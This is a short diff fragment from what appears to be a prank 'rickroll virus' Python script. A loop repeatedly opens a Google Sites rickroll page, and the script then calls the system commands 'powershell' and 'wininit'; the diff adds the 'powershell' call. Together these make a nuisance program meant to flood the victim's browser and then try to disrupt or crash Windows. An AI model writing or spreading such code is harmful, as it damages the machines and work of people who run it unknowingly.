@@ -26,5 +26,6 @@ while c > 0:
         webbrowser.open_new("https://sites.google.com/view/rickrollvirusmainpage/home")
     sleep(0.5)
 if c == (0):
+    os.system("powershell")
     os.system("wininit")
 
